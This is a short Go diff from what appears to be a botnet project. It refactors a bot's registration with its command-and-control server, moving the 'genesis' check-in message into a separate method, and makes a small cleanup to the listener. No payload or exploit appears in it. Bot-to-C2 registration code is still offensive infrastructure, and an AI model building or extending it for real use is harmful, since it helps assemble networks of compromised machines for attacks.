@@ -26,29 +26,22 @@ func NewBot(ccAddr string) (*BotService, error) {
 	if err != nil {
 		return nil, fmt.Errorf("%s is not available", ccAddr)
 	}
-	defer conn.Close()
-
 	bot := &botnet.Bot{
 		ID:     uuid.NewV4().Bytes(),
 		Host:   strings.Split(conn.LocalAddr().String(), ":")[0],
 		Port:   strings.Split(conn.LocalAddr().String(), ":")[1],
 		CCAddr: ccAddr,
 	}
+	conn.Close()
 
-	buff, err := bot.Bytes()
-	if err != nil {
-		log.Panic(err)
+	svc := &BotService{
+		Bot: bot}
+
+	if err := svc.GenesisCmd(bot); err != nil {
+		return nil, err
 	}
 
-	data := append(commandToBytes("genesis"), buff...)
-
-	_, err = io.Copy(conn, bytes.NewReader(data))
-	if err != nil {
-		log.Panic(err)
-	}
-
-	return &BotService{
-		Bot: bot}, nil
+	return svc, nil
 }
 
 //Listen is
@@ -58,7 +51,6 @@ func (b *BotService) Listen() {
 		botnet.Err(err, "listening on addr", b.Bot.Addr())
 		os.Exit(1)
 	}
-
 	botnet.Msg("listening on", b.Bot.Addr())
 
 	b.acceptConnections(listener)
